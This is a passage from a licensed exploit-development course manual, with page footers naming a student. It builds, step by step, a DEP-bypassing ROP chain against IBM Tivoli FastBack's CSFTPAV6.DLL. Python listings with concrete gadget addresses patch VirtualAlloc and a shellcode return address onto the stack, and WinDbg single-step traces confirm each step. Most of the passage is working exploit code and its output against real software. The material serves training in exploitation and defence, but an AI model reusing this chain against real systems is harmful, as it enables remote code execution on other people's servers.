cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x1191: 
50501191 c3              ret 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
403 
0:001> dd esp L1 
0d2ce324  43434343 
Listing 483 - Executing the MOV EAX, ESI gadget 
We let the execution go to the end of the first gadget with the pt command and finish its 
execution with the p command. Now we have entered the gadget containing the MOV EAX, ESI 
instruction. 
Let’s note the starting values of EAX and ESI. After the MOV EAX, ESI instruction, EAX contains 
the same value, which was our goal. 
The second instruction pops the dummy value (0x42424242) into ESI, and when we reach the 
RET instruction, we are ready to execute the next ROP gadget. 
At this point, EAX contains the original address from ESP. Next, we have to pop the -0x1C value 
into ECX and add it to EAX. 
We can use a “POP ECX” instruction to get the negative value into ECX, followed by a gadget 
containing an “ADD EAX, ECX” instruction. This will allow us to add -0x1C to EAX as shown in 
Listing 484.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xffffffe4)) # -0x1C 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 484 - Adding -0x1C to EAX with ROP 
The three lines added in the listing above should accomplish this. Before we execute, we set a 
breakpoint on address 0x505115a3, directly on the POP ECX gadget. 
0:066> bp 0x505115a3 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
0:066> g 
Breakpoint 0 hit 
eax=0d67e31c ebx=0605ab78 ecx=0d67ca70 edx=77071670 esi=42424242 edi=00000000 
eip=505115a3 esp=0d67e328 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6!FtpUploadFileW+0x705: 
505115a3 59              pop     ecx 
 
0:062> p 
eax=0d67e31c ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000 
eip=505115a4 esp=0d67e32c ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6!FtpUploadFileW+0x706: 
505115a4 c3              ret 
 
0:062> p 
eax=0d67e31c ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000 
eip=5051579a esp=0d67e330 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6!FtpUploadFileW+0x48fc: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
404 
5051579a 03c1            add     eax,ecx 
 
0:062> p 
eax=0d67e300 ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000 
eip=5051579c esp=0d67e330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x48fe: 
5051579c c3              ret 
 
0:062> dd eax L1 
0d67e300  45454545 
Listing 485 - Executing POP ECX and ADD EAX, ECX gadgets 
According to the highlighted registers in Listing 485, EAX and ECX are updated and modified 
exactly as desired. We transition smoothly from the POP ECX gadget to the ADD EAX, ECX gadget 
through the RET instruction. 
In addition, the final part of the listing has the address in EAX pointing to the 0x45454545 dummy 
value reserved for VirtualAlloc. 
With the correct value in EAX, we need to move that value back to ESI so we can use it in the next 
stages. We can do this with a gadget containing “PUSH EAX” and “POP ESI” instructions as given 
in Listing 486.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xffffffe4)) # -0x1C 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 486 - Copying EAX into ESI 
Once again, we can relaunch FastBackServer and WinDbg and set a breakpoint on the new 
gadget at 0x50537d5b. 
0:066> bp 0x50537d5b 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
0:066> g 
Breakpoint 0 hit 
eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000 
eip=50537d5b esp=0d37e334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x26ebd: 
50537d5b 50              push    eax 
 
0:006> p 
eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000 
eip=50537d5c esp=0d37e330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x26ebe: 
50537d5c 5e              pop     esi 
 
0:006> p 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
405 
eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000 
eip=50537d5d esp=0d37e334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x26ebf: 
50537d5d c3              ret 
 
0:006> dd esi L1 
0d37e300  45454545 
Listing 487 - Coping EAX into ESI 
After both the push and pop instructions, ESI now has the correct address. The next step is to get 
the VirtualAlloc address into a register. 
We previously found that the IAT address for VirtualAlloc is 0x5054A220, but we know 0x20 is a 
bad character for our exploit. To solve this, we can increase its address by one and then use a 
couple of gadgets to decrease it to the original value. 
First, we use a POP EAX instruction to fetch the modified IAT address into EAX. Then we’ll pop -
0x00000001 (or its equivalent, 0xFFFFFFFF) into ECX through a POP ECX instruction. Next, we 
can reuse the ADD EAX, ECX instruction from the previous gadget to restore the IAT address 
value. 
Finally, we can use a dereference to move the address of VirtualAlloc into EAX through a MOV 
EAX, DWORD [EAX] instruction. We can see observe gadgets added to the updated ROP chain as 
shown in Listing 488.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xffffffe4)) # -0x1C 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret 
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xffffffff)) # -1 into ecx 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 488 - Moving VirtualAlloc address into EAX 
To reiterate, we pop the IAT address of VirtualAlloc increased by one into EAX and pop 
0xFFFFFFFF into ECX. Then we add them together to obtain the real VirtualAlloc IAT address in 
EAX. Finally, we dereference that into EAX. 
Once again, we restart FastBackServer and WinDbg. This time, we set a breakpoint on 
0x5053a0f5 to skip directly to the gadget containing the POP EAX instruction. 
0:066> bp 0x5053a0f5 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:066> g 
Breakpoint 0 hit 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
406 
eax=0d37e300 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000 
eip=5053a0f5 esp=0d37e338 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x29257: 
5053a0f5 58              pop     eax 
 
0:006> p 
eax=5054a221 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000 
eip=5053a0f6 esp=0d37e33c ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x29258: 
5053a0f6 c3              ret 
 
0:006> p 
eax=5054a221 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000 
eip=505115a3 esp=0d37e340 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x705: 
505115a3 59              pop     ecx 
 
0:006> p 
eax=5054a221 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000 
eip=505115a4 esp=0d37e344 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x706: 
505115a4 c3              ret 
 
0:006> p 
eax=5054a221 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000 
eip=5051579a esp=0d37e348 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x48fc: 
5051579a 03c1            add     eax,ecx 
 
0:006> p 
eax=5054a220 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000 
eip=5051579c esp=0d37e348 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0x48fe: 
5051579c c3              ret 
 
0:006> p 
eax=5054a220 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000 
eip=5051f278 esp=0d37e34c ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xe3da: 
5051f278 8b00            mov     eax,dword ptr [eax]  
ds:0023:5054a220={KERNEL32!VirtualAllocStub (76da38c0)} 
 
0:006> p 
eax=76da38c0 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000 
eip=5051f27a esp=0d37e34c ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xe3dc: 
5051f27a c3              ret 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
407 
0:006> u eax L1 
KERNEL32!VirtualAllocStub: 
76da38c0 8bff            mov     edi,edi 
Listing 489 - Obtaining the address of VirtualAlloc from the IAT 
The actions set up by our ROP chain worked out and we have now dynamically obtained the 
address of VirtualAlloc in EAX. The last step is to overwrite the placeholder value on the stack at 
the address we have stored in ESI. 
We can use an instruction like MOV DWORD [ESI], EAX to write the address in EAX onto the 
address pointed to by ESI. Our updated ROP chain in Listing 490 reflects this last step.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xffffffe4)) # -0x1C 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret 
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xffffffff)) # -1 into ecx 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 490 - Writing address of VirtualAlloc on the stack 
As before, we restart FastBackServer and WinDbg and set a breakpoint on the address of our 
newly added gadget. Now we can send the packet: 
0:066> bp 0x5051cbb6 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:066> g 
Breakpoint 0 hit 
eax=76da38c0 ebx=0605b070 ecx=ffffffff edx=77071670 esi=0d5fe300 edi=00000000 
eip=5051cbb6 esp=0d5fe350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d5fe300=45454545 
 
0:006> p 
eax=76da38c0 ebx=0605b070 ecx=ffffffff edx=77071670 esi=0d5fe300 edi=00000000 
eip=5051cbb8 esp=0d5fe350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xbd1a: 
5051cbb8 c3              ret 
 
0:006> dds esi L1 
0d5fe300  76da38c0 KERNEL32!VirtualAllocStub 
Listing 491 - Overwriting placeholder with VirtualAlloc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
408 
We have now achieved the goal we set at the beginning of this section. We successfully patched 
the address of VirtualAlloc at runtime in the API call skeleton placed on the stack by the buffer 
overflow. 
Keep in mind that understanding how to build these types of ROP chains and how they work is 
critical to bypassing DEP and obtaining code execution. 
In the next section, we will need to set up the API call return address in order to be able to execute 
our shellcode after the VirtualAlloc call. 
9.4.5.1 Exercises 
1. 
Use IDA Pro to obtain the IAT address for VirtualAlloc. 
2. 
Create a ROP chain to obtain the stack address that contains the VirtualAlloc placeholder 
value. 
3. 
Create a ROP chain that fetches the VirtualAlloc address. 
4. 
Create a ROP chain that patches the VirtualAlloc address. 
9.4.6 Patching the Return Address 
When a function is called in assembly, the CALL instruction not only transfers execution flow to 
the function address, but at the same time pushes the return address to the top of the stack. 
Once the function finishes, the CPU aligns the stack pointer to the return address, which is then 
popped into EIP. 
Since we control execution through the use of ROP gadgets, normal practices do not apply. Once 
we get to the point of executing VirtualAlloc, we will jump to it by returning into its address on the 
stack. This will not place any further return address on the stack. 
To ensure that execution flow continues to our shellcode once the API finishes, we must 
manually place the shellcode address on the stack, right after the address of VirtualAlloc to 
simulate a real call. This way, our shellcode address will be at the top of the stack when 
VirtualAlloc finishes its job and executes a return instruction. 
In this section, we must solve a problem very similar to patching the address of VirtualAlloc. First, 
we must align ESI with the placeholder value for the return address on the stack. Then we need to 
dynamically locate the address of the shellcode and use it to patch the placeholder value. 
At the end of the last section, ESI contained the address on the stack where VirtualAlloc was 
written. This means that ESI is only four bytes lower than the stack address we need. An 
instruction like ADD ESI, 0x4 would be ideal, but it does not exist in our selected module. 
A common instruction we might find in a gadget is the incremental (INC) instruction. These 
instructions increase the value in a register by one. 
In our case, we can find an INC ESI instruction in multiple gadgets. None of the gadgets are clean, 
but it’s possible to find one without any bad side effects, as shown in Listing 492.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
409 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 492 - Increasing ESI by 4 
In this listing, most of the ROP gadgets from the previous section have been omitted for brevity. 
Notice that we use the increment instruction four times to have ESI increased by four bytes. The 
side effect will only modify EAX, which we do not have to worry about at this point. 
After setting our breakpoint at this new gadget and executing the updated ROP chain, we find that 
the increment gadgets are executed: 
0:066> bp 0x50522fa7 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:066> g 
Breakpoint 0 hit 
eax=76da38c0 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe300 edi=00000000 
eip=50522fa7 esp=0d4fe354 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0x12109: 
50522fa7 46              inc     esi 
 
0:006> dd esi L2 
0d4fe300  76da38c0 46464646 
 
0:006> p 
eax=76da38c0 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe301 edi=00000000 
eip=50522fa8 esp=0d4fe354 ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6!FtpUploadFileW+0x1210a: 
50522fa8 042b            add     al,2Bh 
 
0:006> p 
eax=76da38eb ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe301 edi=00000000 
eip=50522faa esp=0d4fe354 ebp=51515151 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286 
CSFTPAV6!FtpUploadFileW+0x1210c: 
50522faa c3              ret 
... 
eax=76da3841 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe303 edi=00000000 
eip=50522fa7 esp=0d4fe360 ebp=51515151 iopl=0         nv up ei pl nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216 
CSFTPAV6!FtpUploadFileW+0x12109: 
50522fa7 46              inc     esi 
 
0:006> p 
eax=76da3841 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe304 edi=00000000 
eip=50522fa8 esp=0d4fe360 ebp=51515151 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
CSFTPAV6!FtpUploadFileW+0x1210a: 
50522fa8 042b            add     al,2Bh 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
410 
 
0:006> dd esi L1 
0d4fe304  46464646 
Listing 493 - Increasing ESI by 4 
In Listing 493, we skipped from the first INC ESI to the last. Here we find that ESI is now pointing 
to the address of the placeholder value for the return address, which was initially set as 
0x46464646. 
With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the 
“MOV DWORD [ESI], EAX ; RET” gadget to patch the placeholder value. The issue we face now is 
that we do not know the exact address of the shellcode since it will be placed after our ROP chain, 
which we haven’t finished creating yet. 
We will solve this problem by using the value in ESI and adding a fixed value to it. Once we finish 
building the ROP chain, we can update the fixed value to correctly align with the beginning of the 
shellcode. 
First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing 
value in ESI, since we need it there to patch the placeholder value. An instruction like “MOV EAX, 
ESI” is optimal, but unfortunately, the only gadgets containing this instruction also pop a value 
into ESI. We can however solve this by restoring the value in ESI with the previously-used “PUSH 
EAX ; POP ESI ; RET” gadget. 
Since we need to add a small positive offset to EAX, we have to deal with null bytes again. We can 
solve this once more by using a negative value. 
Here we can simply use an arbitrary value, such as 0x210 bytes, represented as the negative 
value 0xfffffdf0. (The reason we use 0x210 instead of 0x200 is to avoid null bytes.) 
We pop this negative value into ECX and use a gadget containing a SUB EAX, ECX instruction to 
set up EAX correctly. The required gadgets are given in Listing 494 as part of the updated ROP 
chain.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xfffffdf0)) # -0x210 
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 494 - Getting shellcode address in EAX 
Let’s execute the ROP chain. This time, we can’t simply set a breakpoint on the gadget that moves 
ESI into EAX and single-step from there, because we use it in an earlier part of the ROP chain. 
Instead, we will let the breakpoint trigger twice before we start single-stepping. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
411 
0:066> bp 0x5050118e 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:066> g 
Breakpoint 0 hit 
eax=00000000 ebx=05f2bd30 ecx=0d1fca70 edx=77071670 esi=0d1fe31c edi=00000000 
eip=5050118e esp=0d1fe320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
CSFTPAV6+0x118e: 
5050118e 8bc6            mov     eax,esi 
 
0:006> g 
Breakpoint 0 hit 
eax=76da386c ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000 
eip=5050118e esp=0d1fe364 ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6+0x118e: 
5050118e 8bc6            mov     eax,esi 
 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000 
eip=50501190 esp=0d1fe364 ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6+0x1190: 
50501190 5e              pop     esi 
 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000 
eip=50501191 esp=0d1fe368 ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6+0x1191: 
50501191 c3              ret 
 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000 
eip=5052f773 esp=0d1fe36c ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6!FtpUploadFileW+0x1e8d5: 
5052f773 50              push    eax 
 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000 
eip=5052f774 esp=0d1fe368 ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6!FtpUploadFileW+0x1e8d6: 
5052f774 5e              pop     esi 
 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000 
eip=5052f775 esp=0d1fe36c ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6!FtpUploadFileW+0x1e8d7: 
5052f775 c3              ret 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
412 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000 
eip=505115a3 esp=0d1fe370 ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6!FtpUploadFileW+0x705: 
505115a3 59              pop     ecx 
 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000 
eip=505115a4 esp=0d1fe374 ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6!FtpUploadFileW+0x706: 
505115a4 c3              ret 
 
0:006> p 
eax=0d1fe304 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000 
eip=50533bf4 esp=0d1fe378 ebp=51515151 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
CSFTPAV6!FtpUploadFileW+0x22d56: 
50533bf4 2bc1            sub     eax,ecx 
 
0:006> p 
eax=0d1fe514 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000 
eip=50533bf6 esp=0d1fe378 ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x22d58: 
50533bf6 c3              ret 
 
0:006> dd eax L4 
0d1fe514  43434343 43434343 43434343 43434343 
Listing 495 - Calculating the shellcode address 
Listing 495 shows that we successfully copied the value from ESI to EAX, while also restoring the 
original value in ESI. In addition, we subtracted a large negative value from EAX to add a small 
positive number to it. Once we know the exact offset from ESI to the shellcode, we can update the 
0xfffffdf0 value to the correct one. 
At this point, EAX contains a placeholder address for our shellcode, which we can update once we 
finish building the entire ROP chain. 
The last step of this section is to overwrite the fake shellcode address (0x46464646) value on the 
stack. Once again, we can do this using a gadget containing a “MOV DWORD [ESI], EAX” 
instruction.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
413 
rop += pack("<L", (0xfffffdf0)) # -0x210 
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 496 - Writing return address to the stack 
This time, we can repeat the action of setting a breakpoint on the last gadget and continue 
execution until we trigger it the second time. Once we’ve done that, we can step through it as 
displayed in Listing 497. 
0:066> bp 0x5051cbb6 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:066> g 
Breakpoint 0 hit 
eax=76da38c0 ebx=05f9bc20 ecx=ffffffff edx=77071670 esi=0d1de300 edi=00000000 
eip=5051cbb6 esp=0d1de350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d1de300=45454545 
 
0:006> g 
Breakpoint 0 hit 
eax=0d1de514 ebx=05f9bc20 ecx=fffffdf0 edx=77071670 esi=0d1de304 edi=00000000 
eip=5051cbb6 esp=0d1de37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
